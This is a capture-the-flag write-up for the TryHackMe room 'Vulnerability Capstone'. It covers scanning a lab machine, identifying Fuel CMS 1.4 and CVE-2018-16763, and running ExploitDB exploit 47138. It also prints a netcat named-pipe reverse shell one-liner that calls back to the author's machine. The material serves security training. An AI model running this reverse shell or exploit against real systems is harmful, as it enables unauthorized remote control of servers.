# Vulnerability-Capstone

This is my first writeup for the TryHackMe room [Vulnerability Capstone](https://tryhackme.com/room/vulnerabilitycapstone) created by [cmnatic](https://tryhackme.com/p/cmnatic).

![image](https://user-images.githubusercontent.com/86648102/134495781-3e8e39d8-136e-47b9-ade0-9513b3fa4ec7.png)

* * *

## Task 1 Introduction

Summarise the skills learnt in this module by completing this capstone room for the "Vulnerability Research" module.

> As said above, completing the above rooms, should give you an edge in solving this CTF.

## Task 2 Exploit the Machine (Flag Submission)

**Answer the questions below**

### \- Deploy the vulnerable machine attached to this task & wait five minutes before visiting the vulnerable machine.

- Ping the machine and test initial connectivity to it.

![image](https://user-images.githubusercontent.com/86648102/134403763-834183b0-4794-4515-997e-6c56b7653542.png)

- Start an nmap scan:

`nmap -sC -sV -v -oN Vulnerabilitycapstonenmapscan.txt -p- 10.10.99.108`

The switches I used are:

- -sC: equivalent to --script=default
- -sV: Probe open ports to determine service/version info
- -v: verbose for realtime output
- -oN: output scan in normal format
- -p-: this scans all 65365 ports
    ![21e6fc889be74738b74352cbc90e0957](https://user-images.githubusercontent.com/86648102/134425485-d991d261-6ee3-4cf2-ba4e-d01aa6c2139d.png)

We are dealing with a **Linux Machine**, having the ports **22** and **80** opened.

### \- What is the name of the application running on the vulnerable machine?

From the nmap output, we see the **FUEL CMS** application being as the title of the page:
![2ceed3d3127a491fbfd8c81fbb61e21d](https://user-images.githubusercontent.com/86648102/134425619-a3489988-0c9b-4218-a353-be86dd3711c3.png)

> Answer: Fuel CMS

* * *

### \- What is the version number of this application?

By opening the browser and accessing the page we see it quite obvious:
![dffe6808b1f840f886f99feb3d3f7349](https://user-images.githubusercontent.com/86648102/134425632-83af5fd6-a098-4a3f-bb0a-d96a32e41f01.png)

> Answer: Version 1.4

* * *

### What is the number of the CVE that allows an attacker to remotely execute code on this application?

![0899fa51d6d047d7aee314190d2ecde1](https://user-images.githubusercontent.com/86648102/134425626-e3cc5b3f-bc2a-4008-b2ac-467a83180f02.png)

![846a1facfd074af7a2b5a5f51b9825c3](https://user-images.githubusercontent.com/86648102/134425624-f3e9f696-f0af-49e9-890e-8b3867565c82.png)

> Answer: CVE:2018-16763

* * *

### Use the resources & skills learnt throughout this module to find and use a relevant exploit to exploit this vulnerability.

> Note:There are numerous exploits out there that can be used for this vulnerability (some more useful than others!)

`searchsploit fuel CMS`

We'll use 47138, as it's the one that appeared on ExploitDB too.

![b1a427247f9f400d83d03d0d03ecb76f](https://user-images.githubusercontent.com/86648102/134425631-604ae303-e1c7-4a49-8a60-46f456d38a30.png)

`searchsploit -m linux/webapps/47138.py`

> -m, --mirror \[EDB-ID\] Mirror (aka copies) an exploit to the current working directory

- Now, with the script downloaded, let's edit it and add our ip in:

`sudo vi 47138.py`

![02bfcb3ca0874482806cf1cb21f12588](https://user-images.githubusercontent.com/86648102/134425616-9ce3520e-b170-4187-8074-b9afb884ff83.png)

After a few tweaks to the script:

`python 47138.py `

![f1789b28dc454cc18c172c8cb8dd0b02](https://user-images.githubusercontent.com/86648102/134425636-1e733733-0a9a-4365-9f93-f0496a2497c4.png)

If you want the commands to work, you need to use " "  for them. For instance:

![346786e33cbc4df5ada172c8d7ab758d](https://user-images.githubusercontent.com/86648102/134425627-03611725-818c-4e16-80e0-fd26004c5005.png)

I got my inspiration from this blog post for the next steps:

[Unicornsec.com](https://unicornsec.com/home/tryhackme-ignite)

- We want now to get a nice shell on our machine.

1.  Set up a listener on our machine, on port 4567 for instance.

`sudo nc -nvlp 4567`

![775872790c364fac912aa6a1d71432ae](https://user-images.githubusercontent.com/86648102/134425630-96bca770-5e2f-4c31-ab72-1b58ddfbdbae.png)

2\. Get the ip of our machine:

`ip addr show tun0`

![e8cbb9211cce44c59d76941e79b27442](https://user-images.githubusercontent.com/86648102/134425633-6dea02a4-697c-4a50-ba43-79b179e9cd7b.png)

3\. Use the following command to spawn a shell back to us. Don't forget about the quotes.

`"rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.8.174.98 4567 >/tmp/f"`

Good, things are moving.

![ec5d4eb24955467ea7111a93d87c8bcb](https://user-images.githubusercontent.com/86648102/134425634-b8474998-1267-46c0-a2de-718824484dbd.png)

`cd /home/ubunbu`

`ls`

`cat flag.txt`

![6e7e01fab67a43adae6bcae517ca82ff](https://user-images.githubusercontent.com/86648102/134425620-7168dc44-8e05-4ae7-acdd-935938eb2ebd.png)

This was the last flag.
Please let me know in case that anything was unclear, as, I'll be happy to explain.

If all was clear, then...
**Congratulations for making it !**

* * *




